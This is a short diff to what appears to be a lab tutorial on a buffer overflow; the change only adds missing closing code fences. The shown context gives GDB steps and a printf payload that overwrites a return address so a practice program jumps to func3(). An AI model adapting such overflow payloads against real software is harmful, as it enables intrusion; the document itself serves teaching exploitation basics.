@@ -42,7 +42,7 @@ Follow these steps to perform the buffer overflow attack:
 1. Launch GDB:
 ```bash
 gdb ./prog
-
+```
 
 2. Set Breakpoints: Use - **`br 21`** to set a breakpoint on line 21 where the overflow occurs.
 
@@ -53,7 +53,7 @@ gdb ./prog
 ```bash
 printf '23 BBBBBBBBBBBBBBBBBB\x97\x11\x40' > input.txt
 gdb -q -ex "r < ./input.txt" prog
-
+```
 
 5. Observe Output: Check that the program redirects execution to func3() and prints the output "Inside func3".
 
